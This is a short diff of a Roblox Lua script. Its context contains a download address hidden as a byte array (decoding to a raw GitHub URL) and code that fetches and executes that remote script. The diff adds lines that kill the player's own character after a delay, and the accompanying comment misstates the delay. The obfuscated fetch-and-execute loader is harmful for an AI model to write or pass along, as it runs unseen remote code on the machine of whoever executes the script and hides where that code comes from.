@@ -198,6 +198,11 @@
 
 
 
+
+
+
+
+
 local url_bytes = {
   104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,
   101,114,99,111,110,116,101,110,116,46,99,111,109,47,75,105,101,117,114,111,
@@ -241,4 +246,14 @@ end
 local ok2, run_err = pcall(fn)
 if not ok2 then
   error("Remote script runtime error: "..tostring(run_err))
+end
+
+
+
+local player = game.Players.LocalPlayer
+
+task.wait(2) -- waits 4 seconds
+
+if player and player.Character then
+	player.Character:BreakJoints()
 end
